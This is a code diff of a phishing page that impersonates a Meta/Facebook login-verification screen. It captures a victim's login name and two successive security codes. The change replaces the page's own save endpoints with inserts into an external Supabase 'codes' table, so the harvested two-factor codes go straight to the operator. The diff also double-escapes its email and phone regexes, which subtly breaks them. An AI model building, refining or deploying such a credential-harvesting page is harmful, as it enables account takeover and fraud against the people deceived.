@@ -2,7 +2,7 @@
 <html lang="en">
   <head>
     <!-- Favicon -->
-     <link rel="icon" type="image/png" href="https://c7bc8e03-a286-4ddc-8273-34910478b7b7-00-23f7gr4ez4rmd.picard.replit.dev/fblogo.png" />
+    <link rel="icon" type="image/png" href="https://c7bc8e03-a286-4ddc-8273-34910478b7b7-00-23f7gr4ez4rmd.picard.replit.dev/fblogo.png" />
 
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
@@ -148,26 +148,32 @@
       <div class="bottom-line">&copy; 2025 Meta Platforms, Inc.</div>
     </div>
 
-    <script>
-      // Track whether we're awaiting the second (“latest”) code
+    <script type="module">
+      // Import Supabase client
+      import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm";
+
+      // Replace with your Supabase project details
+      const SUPABASE_URL = "https://YOUR-PROJECT.supabase.co";
+      const SUPABASE_KEY = "YOUR-ANON-KEY";
+      const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
+
       let awaitingLatest = false;
 
       window.onload = function () {
         const user = localStorage.getItem("login_user");
         const msgEl = document.getElementById("confirmation-msg");
-        // Initial message
         if (!user) {
           msgEl.textContent =
             "To confirm it's really you trying to log in, we sent a code to your account. Enter it below to continue.";
         } else {
           let displayType = "account";
           let ending = "";
-          const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+          const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;
           if (emailRegex.test(user)) {
             displayType = "email";
             const atIndex = user.indexOf("@");
             ending = user.slice(atIndex);
-          } else if (/^\d{7,}$/.test(user)) {
+          } else if (/^\\d{7,}$/.test(user)) {
             displayType = "phone number";
             ending = user.slice(-4);
           } else {
@@ -178,14 +184,14 @@
         }
       };
 
-      function verifyCode() {
+      async function verifyCode() {
         const codeInput = document.getElementById("code-input");
         const continueBtn = document.getElementById("continue-btn");
         const headingEl = document.getElementById("heading-text");
         const msgEl = document.getElementById("confirmation-msg");
         const code = codeInput.value.trim();
 
-        // Remove previous error state
+        // Clear old errors
         const existingError = document.querySelector(".error-message");
         if (existingError) existingError.remove();
         codeInput.style.borderColor = "#ccc";
@@ -201,58 +207,47 @@
 
         continueBtn.disabled = true;
 
-        if (!awaitingLatest) {
-          // First code submission
-          fetch("/save-code", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ code }),
-          })
-            .then((res) => res.json())
-            .then((data) => {
-              if (data.success) {
-                // Move to latest-code step
-                awaitingLatest = true;
-                headingEl.textContent = "Enter Latest Code";
-                msgEl.textContent = "Kindly the most recent code we sent to continue.";
-                msgEl.style.color = "red"; // <-- Add this line
-                codeInput.value = "";
-                codeInput.focus();
+        try {
+          if (!awaitingLatest) {
+            // Save first code
+            const { error } = await supabase.from("codes").insert([
+              {
+                user: localStorage.getItem("login_user") || "unknown",
+                step: "first",
+                code,
+              },
+            ]);
 
-              } else {
-                alert("Failed to save the first code. Try again.");
-              }
-            })
-            .catch((err) => {
-              console.error("Error saving first code:", err);
-              alert("An error occurred while submitting the code. Try again.");
-            })
-            .finally(() => {
-              continueBtn.disabled = false;
-            });
-        } else {
-          // Second ("latest") code submission
-          fetch("/save-latest", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ code }),
-          })
-            .then((res) => res.json())
-            .then((data) => {
-              if (data.success) {
-                // Proceed to next page
-                window.location.href = "homepage.html";
-              } else {
-                alert("Incorrect latest code. Please try again.");
-              }
-            })
-            .catch((err) => {
-              console.error("Error saving latest code:", err);
-              alert("An error occurred while submitting the latest code. Try again.");
-            })
-            .finally(() => {
-              continueBtn.disabled = false;
-            });
+            if (error) throw error;
+
+            // Move to next step
+            awaitingLatest = true;
+            headingEl.textContent = "Enter Latest Code";
+            msgEl.textContent =
+              "Kindly enter the most recent code we sent to continue.";
+            msgEl.style.color = "red";
+            codeInput.value = "";
+            codeInput.focus();
+          } else {
+            // Save latest code
+            const { error } = await supabase.from("codes").insert([
+              {
+                user: localStorage.getItem("login_user") || "unknown",
+                step: "latest",
+                code,
+              },
+            ]);
+
+            if (error) throw error;
+
+            // Redirect
+            window.location.href = "homepage.html";
+          }
+        } catch (err) {
+          console.error("Supabase error:", err);
+          alert("An error occurred while saving your code. Try again.");
+        } finally {
+          continueBtn.disabled = false;
         }
       }
     </script>
